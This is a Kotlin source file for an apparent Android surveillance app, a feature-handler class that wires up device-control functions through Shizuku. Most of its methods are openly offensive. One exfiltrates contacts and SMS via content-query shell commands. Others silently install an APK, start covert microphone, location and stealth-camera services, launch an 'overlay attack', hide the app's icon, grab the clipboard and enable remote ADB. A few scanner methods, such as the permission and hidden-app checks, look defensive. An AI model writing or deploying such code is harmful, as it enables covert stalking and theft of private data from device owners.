package com.anti.rootadbcontroller.features

import android.app.ActivityManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Log
import com.anti.rootadbcontroller.services.LocationTrackerService
import com.anti.rootadbcontroller.services.MicRecorderService
import com.anti.rootadbcontroller.services.OverlayService
import com.anti.rootadbcontroller.services.RemoteAdbService
import com.anti.rootadbcontroller.services.ShizukuManagerService
import com.anti.rootadbcontroller.services.StealthCameraService
import com.anti.rootadbcontroller.utils.Constants.TAG
import java.io.File
import java.io.IOException

/**
 * Handles the implementation of various features in the application.
 * This class centralizes feature logic that was previously in MainActivity.
 */
class FeatureHandler(private val context: Context) {

    /**
     * Opens accessibility settings for keylogging feature.
     */
    fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        context.startActivity(intent)
    }

    /**
     * Extracts sensitive data like contacts and messages.
     */
    fun exfiltrateAllData(shizukuManagerService: ShizukuManagerService?) {
        // This would combine all data extraction methods into one
        shizukuManagerService?.executeCommandAsync("content query --uri content://com.android.contacts/data --projection display_name:data1:mimetype") { result ->
            saveDataToFile("extracted_contacts.txt", result.output)
        }
        shizukuManagerService?.executeCommandAsync("content query --uri content://sms/inbox --projection address:body:date") { result ->
            saveDataToFile("extracted_messages.txt", result.output)
        }
        // ... and so on for other data types
    }

    /**
     * Finds and installs the first APK found on the device.
     */
    fun findAndInstallFirstApk(shizukuManagerService: ShizukuManagerService?) {
        shizukuManagerService?.executeCommandAsync("find /sdcard -name \"*.apk\"") { result ->
            val firstApk = result.output.lines().firstOrNull { it.isNotBlank() }
            if (firstApk != null) {
                shizukuManagerService.installApkAsync(firstApk) { success, _ ->
                    Log.d(TAG, "Silent install success: $success")
                }
            }
        }
    }

    /**
     * Monitors network connections.
     */
    fun startNetworkMonitoring(shizukuManagerService: ShizukuManagerService?) {
        shizukuManagerService?.executeCommandAsync("netstat -tunap") { result ->
            saveDataToFile("network_connections.txt", result.output)
        }
    }

    /**
     * Browses system files.
     */
    fun browseSystemFiles(shizukuManagerService: ShizukuManagerService?) {
        shizukuManagerService?.executeCommandAsync("ls -la /data") { result ->
            saveDataToFile("file_listing_data.txt", result.output)
        }
    }

    /**
     * Reboots the device.
     */
    fun rebootDevice(shizukuManagerService: ShizukuManagerService?) {
        shizukuManagerService?.executeCommandAsync("reboot") { }
    }

    /**
     * Takes a screenshot.
     */
    fun takeScreenshot(shizukuManagerService: ShizukuManagerService?) {
        val screenshotFile = File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            "screenshot_${System.currentTimeMillis()}.png"
        )
        shizukuManagerService?.executeCommandAsync("screencap -p ${screenshotFile.absolutePath}") {
            Log.d(TAG, "Screenshot saved to ${screenshotFile.absolutePath}")
        }
    }

    /**
     * Shows system logs.
     */
    fun showLogAccess(shizukuManagerService: ShizukuManagerService?) {
        shizukuManagerService?.executeCommandAsync("logcat -d") { result ->
            saveDataToFile("system_logs.txt", result.output)
        }
    }

    /**
     * Starts microphone recording.
     */
    fun startMicRecording() {
        context.startService(Intent(context, MicRecorderService::class.java))
    }

    /**
     * Starts location tracking.
     */
    fun startLocationTracking() {
        context.startService(Intent(context, LocationTrackerService::class.java))
    }

    /**
     * Starts overlay attack.
     */
    fun startOverlayAttack() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))
            context.startActivity(intent)
        } else {
            context.startService(Intent(context, OverlayService::class.java))
        }
    }

    /**
     * Hides the app icon from the launcher.
     */
    fun hideAppIcon(componentName: ComponentName) {
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /**
     * Scans for apps with dangerous permissions.
     */
    fun scanPermissions() {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val report = StringBuilder()
        val dangerousPermissions = setOf(
            "android.permission.CAMERA", "android.permission.RECORD_AUDIO",
            "android.permission.READ_CONTACTS", "android.permission.READ_SMS",
            "android.permission.ACCESS_FINE_LOCATION"
        )

        for (appInfo in packages) {
            try {
                val requestedPermissions = pm.getPackageInfo(appInfo.packageName, PackageManager.GET_PERMISSIONS).requestedPermissions
                if (requestedPermissions != null) {
                    val grantedDangerous = requestedPermissions.filter { dangerousPermissions.contains(it) }
                    if (grantedDangerous.isNotEmpty()) {
                        report.append("App: ${appInfo.loadLabel(pm)} (${appInfo.packageName})\n")
                        grantedDangerous.forEach { report.append("  - $it\n") }
                        report.append("\n")
                    }
                }
            } catch (e: PackageManager.NameNotFoundException) {
                // Ignore
            }
        }
        saveDataToFile("permissions_report.txt", report.toString())
    }

    /**
     * Detects apps with overlay permissions.
     */
    fun detectOverlays() {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val report = StringBuilder("Apps with Overlay Permission:\n")
        for (appInfo in packages) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(context)) {
                    report.append("- ${appInfo.loadLabel(pm)} (${appInfo.packageName})\n")
                }
            }
        }
        saveDataToFile("overlay_report.txt", report.toString())
    }

    /**
     * Finds hidden apps.
     */
    fun findHiddenApps() {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val report = StringBuilder("Hidden Apps Found:\n")
        for (appInfo in packages) {
            val intent = pm.getLaunchIntentForPackage(appInfo.packageName)
            if (intent == null && (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                report.append("- ${appInfo.loadLabel(pm)} (${appInfo.packageName})\n")
            }
        }
        saveDataToFile("hidden_apps_report.txt", report.toString())
    }

    /**
     * Detects camera and microphone usage.
     */
    fun detectCameraMicUsage() {
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val report = StringBuilder("Camera/Mic Status:\n")
        report.append("Microphone active: ${!audioManager.isMicrophoneMute}\n")
        // Camera usage detection is more complex and requires callbacks. This is a simplified check.
        report.append("Camera in use: Checking would require a persistent service.\n")
        saveDataToFile("camera_mic_status.txt", report.toString())
    }

    /**
     * Takes a stealth picture.
     */
    fun takeStealthPicture() {
        context.startService(Intent(context, StealthCameraService::class.java))
    }

    /**
     * Gets clipboard content.
     */
    fun getClipboard() {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val content = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard is empty."
        saveDataToFile("clipboard_content.txt", content)
    }

    /**
     * Sets clipboard content.
     */
    fun setClipboard(text: String) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("label", text)
        clipboard.setPrimaryClip(clip)
    }

    /**
     * Shows Shizuku operations.
     */
    fun showShizukuOperations(shizukuManagerService: ShizukuManagerService?) {
        if (shizukuManagerService == null) {
            Log.w(TAG, "Shizuku not available for operations")
            return
        }

        // Execute a test command through Shizuku
        shizukuManagerService.executeCommandAsync("getprop ro.build.version.release") { result ->
            Log.i(TAG, "Android version: ${result.output}")
            saveDataToFile("shizuku_test.txt", "Android version: ${result.output}")
        }
    }

    /**
     * Shows package manager operations.
     */
    fun showPackageManager(shizukuManagerService: ShizukuManagerService?) {
        if (shizukuManagerService == null) {
            Log.w(TAG, "Shizuku not available for package management")
            return
        }

        // Get list of installed packages
        shizukuManagerService.listPackages(true) { success, operation, result ->
            if (success) {
                saveDataToFile("installed_packages.txt", result)
                Log.i(TAG, "Package list saved")
            }
        }
    }

    /**
     * Shows system properties.
     */
    fun showSystemProperties(shizukuManagerService: ShizukuManagerService?) {
        if (shizukuManagerService == null) {
            Log.w(TAG, "Shizuku not available for system properties")
            return
        }

        // Get device information
        shizukuManagerService.getSystemInfo { success, operation, result ->
            if (success) {
                saveDataToFile("device_info.txt", result)
                Log.i(TAG, "Device info saved: $result")
            }
        }
    }

    /**
     * Toggles remote ADB.
     */
    fun toggleRemoteAdb() {
        context.startService(Intent(context, RemoteAdbService::class.java))
    }

    /**
     * Checks if a service is running.
     */
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        @Suppress("DEPRECATION")
        return manager.getRunningServices(Integer.MAX_VALUE).any {
            serviceClass.name == it.service.className
        }
    }

    /**
     * Saves data to a file.
     */
    private fun saveDataToFile(fileName: String, data: String) {
        val file = File(context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS), fileName)
        try {
            file.writeText(data)
            Log.d(TAG, "Data saved to ${file.absolutePath}")
        } catch (e: IOException) {
            Log.e(TAG, "Failed to save data to file", e)
        }
    }
}
